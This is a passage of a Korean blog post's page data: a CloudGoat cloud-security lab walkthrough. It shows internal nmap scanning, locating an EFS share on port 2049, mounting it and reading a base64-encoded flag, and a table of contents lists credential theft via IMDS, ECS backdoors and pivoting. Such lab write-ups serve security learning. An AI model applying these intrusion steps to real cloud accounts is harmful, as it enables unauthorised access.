url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABIUlEQVQoz3WR626CUBCEqVVB09Y2AlpKRYEDilzkJl4wVtv3f6Vpdq2NMfpjcnZzkm9ndiXbXUBMc3izAvFiC39WIEq2XJujAKrusIaGh8G7gDZw0NdsNJpveHh85fdSkutlyMsvZMUeeXlAGK+xyHasJK1RVt9I0h3/x2mN2bxiNdv928DROMQ0WLIrn13WCMIVgmiFKNlA+Dm7Nczpn0sP+tBFW1HvAx0vxXPP5KlyR4fc0aB0B1wrXf2/bskq121Fux/ZmkSYOAlPZbhIWRSR+rEdc3RKQfuTGj3WGXYNlQh2AgoIP+MdEoT2Svv9tOao1j8olgdYdozWRdSbDh1xuvLwwwddnJyQMzoK9QQsqyPCeIO02OPpxWCH16Az8BcxQ7mT58Dq/wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/50377c84b314051018fda9b1c69b1aa7/37523/34.png\"\n        srcset=\"/static/50377c84b314051018fda9b1c69b1aa7/e9ff0/34.png 180w,\n/static/50377c84b314051018fda9b1c69b1aa7/f21e7/34.png 360w,\n/static/50377c84b314051018fda9b1c69b1aa7/37523/34.png 720w,\n/static/50377c84b314051018fda9b1c69b1aa7/ea7fb/34.png 788w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">EFS:ClientMount</code> 권한에서 EFS를 탑재할 수 있는데 EFS를 나열할 수 없는 경우에는 Shared Mount를 진행해야 합니다. 그렇기 때문에 로컬 내에서존재하는 EFS 포트 스캐닝을 진행해야 합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA80lEQVQY0z3P226CQBRG4aFWGw0eoDOAB1AGAXFEqha0mjTtRd//kZYRk17tq3/l2yIvakx5oTBnit2ZdXYk39ak+Yk4qYiWBqliXBkjvQR/mhHMcuZhgResCZeGd6UR1piXVweRZId2PHEjpKdx5Qrlr/GCFH+aMnQiuqMFvYFkMFbYjk+37yKEjRDD57VGbczqTBCFaTh+/rSah+wh3JiGsrpRN7/obYPa33B1xXSVosscvcuZJZpeX/I2kP+xVlhWVy7XPx6v7z9ubdSUXxxO32y2NV5YMNYVwyBDJQY3SpGrDLWI8cIIOQ+xnYBO9ym8A93Ra5+x7eB0AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/c436baa75bf0e63dfa6aa54dc4f882b7/37523/35.png\"\n        srcset=\"/static/c436baa75bf0e63dfa6aa54dc4f882b7/e9ff0/35.png 180w,\n/static/c436baa75bf0e63dfa6aa54dc4f882b7/f21e7/35.png 360w,\n/static/c436baa75bf0e63dfa6aa54dc4f882b7/37523/35.png 720w,\n/static/c436baa75bf0e63dfa6aa54dc4f882b7/d7542/35.png 810w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">snap</code> 으로 nmap 도구를 연결한후 로컬 내에 스캐닝을 진행합니다. 만약에 <code class=\"language-text\">snap</code>으로 nmap 도구를 다운로드 받았을 경우에 snap에게 네트워크를 제어할 수있도록 명령을 주어야 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">sudo snap connect nmap<span class=\"token punctuation\">:</span>network<span class=\"token operator\">-</span>control</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.111111111111107%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA1klEQVQY03WQ2Q6CQAxFxz3EBYEBVFAYFhlRccUY//+/rmmNxBh9OLl9aE5vKnRZgyh3d6T5CSo9QJc3FJsrZ6T2SPIjdtUDeXHhvSQ7wvVTGMMZRNtEu2s1iLW+YBFqqOwlImFWnLGMtpBeAkvG8GY5zyRx/QyOqyBaE7Q6U5a8k4XFpobtKsRphbd8YHjo9h1eJIQYfTFuBJ8yFlJ9ahWuSsafv9pQi3mgYcuYDxC9gWzmXzIW0t/ipGIpJf2JoN+Z1hJjM4QtFaZ2hNEkgOVEPP8TPgG3Rn6HYnG3EAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/661716ac7f7bbac5b261c64945aed0a3/37523/36.png\"\n        srcset=\"/static/661716ac7f7bbac5b261c64945aed0a3/e9ff0/36.png 180w,\n/static/661716ac7f7bbac5b261c64945aed0a3/f21e7/36.png 360w,\n/static/661716ac7f7bbac5b261c64945aed0a3/37523/36.png 720w,\n/static/661716ac7f7bbac5b261c64945aed0a3/4ff83/36.png 843w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다음과 같이 2049 포트가 열려 있는 것을 확인할 수 있으며 EFS 역시 대부분의 파일 공유와 만찬가지로 포트 2049가 열려 있어야 합니다.</li>\n<li>내부 로컬내에서 열려 있는 ip 대역은 <code class=\"language-text\">10.10.10.104</code> 임을 확인할 수있습니다.</li>\n</ul>\n<h3 id=\"efs-shared-mount-and-flag\" style=\"position:relative;\"><a href=\"#efs-shared-mount-and-flag\" aria-label=\"efs shared mount and flag permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EFS Shared Mount and FLAG!</h3>\n<ul>\n<li>스캐닝을 통해서 shared mount를 진행할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 11.666666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAX0lEQVQI12MwMrH/r65p+l9dyxRMS0qr/2fnFPvPwSUOprl4JP9zckvAaRgGySPTbBwi/5lYBP8zaGib/ZdT0PmvoKT3X15R97+ouPJ/Lh4pqGLsBnLxgGh0A0XBBgIA3oAxaL7KfhQAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/2bb36606944635c3bfeed417f70f271e/37523/37.png\"\n        srcset=\"/static/2bb36606944635c3bfeed417f70f271e/e9ff0/37.png 180w,\n/static/2bb36606944635c3bfeed417f70f271e/f21e7/37.png 360w,\n/static/2bb36606944635c3bfeed417f70f271e/37523/37.png 720w,\n/static/2bb36606944635c3bfeed417f70f271e/302a4/37.png 1080w,\n/static/2bb36606944635c3bfeed417f70f271e/a7a19/37.png 1323w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>shared Mount가 완료되면 <code class=\"language-text\">/admin</code> 디렉토리를 찾아가 디렉토리 내에서 base64로 디코딩된 플래그를 찾을 수 있게 됩니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 7.222222222222221%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAR0lEQVQI12NQ0zD5r6Zp8l9V3fi/uqYJGOsb2vzXM7D+Ly2r+V9ETOk/J7c4GHNwif3n5pUCYw4ucTDNxSMJZUv+Z2YV+g8AT2AaO+BU/6AAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/e1d688d49e32bc6e6f43b192b97ff915/37523/38.png\"\n        srcset=\"/static/e1d688d49e32bc6e6f43b192b97ff915/e9ff0/38.png 180w,\n/static/e1d688d49e32bc6e6f43b192b97ff915/f21e7/38.png 360w,\n/static/e1d688d49e32bc6e6f43b192b97ff915/37523/38.png 720w,\n/static/e1d688d49e32bc6e6f43b192b97ff915/40601/38.png 945w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 77.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEO0lEQVQ4yx3SWXMTBQDA8Tw4jg+MvqjgiFCg6YHSg9OhaLmEkQet1RFQrKJQLulABRkEHQqFHvTKuckmu9kke2RzNDdN2xBoxwINtgNFcLzGGX3x1U/wd/Qb/B5+lkD4Pm6pjMs/g6bfxzDKBJQpgkoRwRFHdI/iHNExAmOEfXm8QorB60GczjhBZQI1NIXsH8dmjzBgT2LxBss4pVnE8H206AMiiQek8k9IJefxebOIvjy6dpObE4+JhicRhVGGBjX8coFc/hHp1ENM8x5DtigDrhwWpzyLEntMpvQ3ij5HJLmAGZ8nFi2jhkoo3d8xeHwfuitANnGXkDKGzR7DJWTQjBnS6UdISglBKmAXi1hEdZ5Y4S/GZ/4hkv4ZRS+TSD4klV7AkNOMtG3j4jubudzWStwoEovPYLeZeMQcgpjHJ00gqbfJFX/7H2PxmwsEE08w878j67Oo0TKZ7I/cLP5KJJDC29GGcroD4VQHokvH78tgHzHQ9FsooUmcYhZZvU1x+k+SY79g0TI/ER5dQIrcw8w8JKBOEzFnSCVmMQI5pDMnkU8cJtLdi+KNE/Sncdh0JCmPaU7jVyaIjpZJpOaJ5R5j8UXuIkXuIBlTBIwpfEoBtzuBoRbQgmMI5y/Qf2g/nsu9pIwC0VCekcEgojeJX8zi9edIZH4gkS6TLf2BxauV8ISKCMoNPHIWLVJEC98gIifoO3eea+2f0XP8CFdOnuNASytnjhxluMeF22kgiklUo4RHyiFrk6jJeSxeo4Q3PI5bTuLxJxB9cXyOIF9+2MrGmsV83LoHW1cfxw4epeHVWhqqrRxofR/B/t9Fg7BaRDOn8Cg3CCfnsLjD44hqAac/jttnooRS9JzvYq11CY0NVWxYW83hT/bRsqOZpvXrWFu3ht3NbxAUIwTkNIZ+i4g5hT88jhy9i8WrTyJHS3iUNF45hq7n6D57kcaqF6mrW05dXSUte5rp+nQvnS3vUlW5lJ1vbiYgqAR8SeLx78nl59AT02iZOSyOYB5HIM2wx8QpGuhalq7OC9RUPMvq2heorlnCrq3r2butkS/e2kK1tYKmjfXY+myILgNVn8SM3yagFVASd7AM+UZxBlIMCQaCnCAYSGA7dZbtDVZWrVpE7eplvL19E683VlJrfZ7612qprHiJb776Gr8ngkPQcIkx7GIUQZ3ActUeos8RpmdYpn8kgGNYRDrdyec7m3ll2VPU1LzMji31NK2zUmVdzMb6lXz03gd4nQpuV4ghu8J1m8KAQ2FQMLF0Dfi4PCBypd9Dd68Lm03i2plv2VS7lIrlz7CiYhG7t29gV1MDVutKOo+dICrHEQUVQQjjcIUZcYawucP02YNYLvW5udQv0NXr5mqfm/4BF7Z+D1s3rKdqxXNULH2atv2tdBxqZ01tDe0H29FkE68QQhQ1PF4DQdTxSDqDLoV/AdrlUdVn9EnvAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/01dd02f7f11208721149f03521987284/37523/39.png\"\n        srcset=\"/static/01dd02f7f11208721149f03521987284/e9ff0/39.png 180w,\n/static/01dd02f7f11208721149f03521987284/f21e7/39.png 360w,\n/static/01dd02f7f11208721149f03521987284/37523/39.png 720w,\n/static/01dd02f7f11208721149f03521987284/d2a60/39.png 807w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>플래그를 확인할 수 있습니다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\">시나리오 개요</a></p>\n<ul>\n<li><a href=\"#%EC%9E%90%EC%9B%90\">자원</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\">취약점</a></li>\n<li><a href=\"#%EB%AA%A9%ED%91%9C\">목표</a></li>\n<li><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 흐름도</a></li>\n<li><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\">시나리오 환경설정</a></li>\n<li><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 시나리오 흐름도</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\">Exploit 시나리오</a></p>\n<ul>\n<li><a href=\"#iam-solo-%EC%82%AC%EC%9A%A9%EC%9E%90%EC%9D%98-aws-credential-%EC%A0%95%EB%B3%B4-%EB%85%B8%EC%B6%9C\">IAM Solo 사용자의 AWS Credential 정보 노출</a></li>\n<li><a href=\"#iam-user--solo-codebuild-project-%EA%B6%8C%ED%95%9C-%EC%97%B4%EA%B1%B0\">IAM User : Solo, CodeBuild Project 권한 열거</a></li>\n<li><a href=\"#iam-user-calrissian-profile-%EB%93%B1%EB%A1%9D-%EB%B0%8F-%EA%B6%8C%ED%95%9C-%EC%97%B4%EA%B1%B0\">IAM User: calrissian Profile 등록 및 권한 열거</a></li>\n<li><a href=\"#rds-instance-snapshot\">RDS Instance SnapShot</a></li>\n<li><a href=\"#ssmdescribeparameters\">SSM:DescribeParameters</a></li>\n<li><a href=\"#imds-%EC%84%9C%EB%B9%84%EC%8A%A4%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-%EC%97%B4%EA%B1%B0\">IMDS 서비스를 이용한 열거</a></li>\n<li><a href=\"#imds-%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-iam-crendentail-%ED%83%88%EC%B7%A8\">IMDS 를 이용한 IAM Crendentail 탈취</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94-1\">시나리오 개요</a></p>\n<ul>\n<li><a href=\"#%EC%9E%90%EC%9B%90-1\">자원</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-1\">취약점</a></li>\n<li><a href=\"#%EB%AA%A9%ED%91%9C-1\">목표</a></li>\n<li><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84-1\">exploit 흐름도</a></li>\n<li><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95-1\">시나리오 환경설정</a></li>\n<li><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84-1\">exploit 시나리오 흐름도</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-1\">Exploit 시나리오</a></p>\n<ul>\n<li><a href=\"#ruse-ec2-ssh-%EC%A0%91%EC%86%8D\">ruse EC2 SSH 접속</a></li>\n<li><a href=\"#ec2-instance-profile-%EA%B5%AC%EC%84%B1%EB%B0%8F-%EC%A0%95%EB%B3%B4-%EB%82%98%EC%97%B4\">EC2 Instance Profile 구성및 정보 나열</a></li>\n<li><a href=\"#ecs-%ED%81%B4%EB%9F%AC%EC%8A%A4%ED%84%B0-%EC%A0%95%EB%B3%B4%EC%99%80-%EB%8F%99%EC%9E%91%EC%A4%91%EC%9D%B8-%EC%84%9C%EB%B9%84%EC%8A%A4-%EB%82%98%EC%97%B4\">ECS 클러스터 정보와 동작중인 서비스 나열</a></li>\n<li><a href=\"#ecs-%EA%B6%8C%ED%95%9C-%EC%83%81%EC%8A%B9\">ECS 권한 상승</a></li>\n<li><a href=\"#ecs-backdoor\">ECS Backdoor</a></li>\n<li><a href=\"#%EB%B0%B1%EB%8F%84%EC%96%B4-%ED%8E%98%EC%9D%B4%EB%A1%9C%EB%93%9C-%EC%A0%84%EB%8B%AC\">백도어 페이로드 전달</a></li>\n<li><a href=\"#admin-ec2%EB%A1%9C-pivot\">Admin EC2로 Pivot</a></li>\n<li><a href=\"#%ED%8F%AC%ED%8A%B8-%EC%8A%A4%EC%BA%90%EB%8B%9D\">포트 스캐닝</a></li>\n<li><a href=\"#efs-shared-mount-and-flag\">EFS Shared Mount and FLAG!</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 8 (CloudGoat: codebuild_secrets)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-8/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/cloud-service-vuln-6/","nextSlug":"/cloud-service-vuln-7/","prevSlug":"/cloud-service-vuln-8/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}